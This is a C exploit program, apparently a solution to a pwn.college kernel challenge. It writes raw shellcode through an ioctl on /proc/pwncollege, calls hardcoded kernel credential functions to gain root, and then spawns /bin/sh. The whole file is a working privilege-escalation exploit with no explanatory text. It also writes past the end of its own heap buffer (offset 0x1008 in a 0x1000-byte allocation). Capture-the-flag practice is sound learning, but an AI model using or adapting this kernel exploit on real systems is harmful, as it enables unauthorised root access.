#include <fcntl.h>
#include <stdint.h>
#include <stdlib.h>
#include <string.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <unistd.h>

unsigned char shellcode_bin[] = {0x48, 0x31, 0xff, 0x49, 0xc7, 0xc1, 0x60,
                                 0x96, 0x08, 0x81, 0x41, 0xff, 0xd1, 0x48,
                                 0x89, 0xc7, 0x49, 0xc7, 0xc1, 0x10, 0x93,
                                 0x08, 0x81, 0x41, 0xff, 0xd1, 0xc3};

int main() {
  int fd = open("/proc/pwncollege", O_RDWR);

  char *payload = malloc(0x1000);
  uint64_t len = sizeof(shellcode_bin);

  uint64_t target_addr = 0xffffc90000085000;

  memcpy(payload, &len, 8);
  memcpy(payload + 8, shellcode_bin, len);
  memcpy(payload + 0x1008, &target_addr, 8);

  ioctl(fd, 0x539, payload);
  execl("/bin/sh", "/bin/sh", 0);

  return 0;
}
